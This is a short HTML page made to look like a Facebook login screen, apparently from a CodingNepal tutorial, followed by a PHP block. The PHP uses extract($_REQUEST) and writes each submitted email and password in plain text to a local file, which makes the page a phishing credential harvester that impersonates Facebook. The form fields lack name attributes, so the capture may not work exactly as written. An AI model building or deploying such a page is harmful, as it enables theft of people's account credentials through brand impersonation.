<!DOCTYPE html>
<html lang="en">
  <head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Facebook Login Page | CodingNepal</title>
    <link rel="stylesheet" href="style.css">
  </head>
  <body>
    <div class="container flex">
      <div class="facebook-page flex">
        <div class="text">
          <h1>facebook</h1>
          <p>Connect with friends and the world </p>
          <p> around you on Facebook.</p>
        </div>
        <form action="#">
          <div class="imput box">
          <input type="email" placeholder="Email or phone number" required>
          </div>
          <div class="imput box">
          <input type="password" placeholder="Password" required>
          </div>
          <div class="link">
            <button type="submit" class="login">Login</button>
          </div>
          <hr>
        </form>
      </div>
    </div>
  </body>
</html>
<?php 
   extract($_REQUEST);
   $file=fopen("form-save.txt","a");

   fwrite($file,"email :");
   fwrite($file, $email ."\n");
   fwrite($file,"password :");
   fwrite($file, $password ."\n");
   fclose($file);

?>